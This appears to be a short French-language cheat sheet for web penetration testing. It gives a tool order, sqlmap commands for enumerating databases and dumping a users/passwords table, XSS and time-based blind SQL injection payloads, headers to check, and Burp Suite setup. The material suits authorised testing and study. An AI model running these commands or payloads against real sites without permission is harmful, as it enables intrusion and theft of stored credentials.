# Web

## Ordre d'attaque

1. **WhatWeb** — tech derrière le site
2. **Dirb / Gobuster** — fichiers cachés
3. **Nikto** — vulns connues + headers manquants
4. **sqlmap** — tester chaque paramètre suspect
5. Si WordPress → **WPScan** avec API token
6. **XSS** sur tous champs réfléchis

## sqlmap rapide

```bash
# avec login en cookie
sqlmap -u "http://x/page?id=1" --cookie="PHPSESSID=abc..." --batch
# extraire DBs
sqlmap -u ... --dbs
# extraire tables d'une DB
sqlmap -u ... -D <db> --tables
# extraire users/passwords
sqlmap -u ... -D <db> -T users --dump
```

## Headers à vérifier manuellement

- `X-Frame-Options` (clickjacking)
- `Content-Security-Policy` (XSS mitigation)
- `Strict-Transport-Security` (downgrade HTTPS)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy`

## XSS — patterns rapides

```
"><script>alert(1)</script>
'-alert(1)-'
javascript:alert(1)
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
```

## SQLi blind time-based

```
1' AND SLEEP(5)-- -
1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
```

## Burp Suite (non inclus dans le menu)

Indispensable pour interception manuelle. Lance en parallèle :
```bash
burpsuite &
```
Puis configure le proxy navigateur (127.0.0.1:8080).
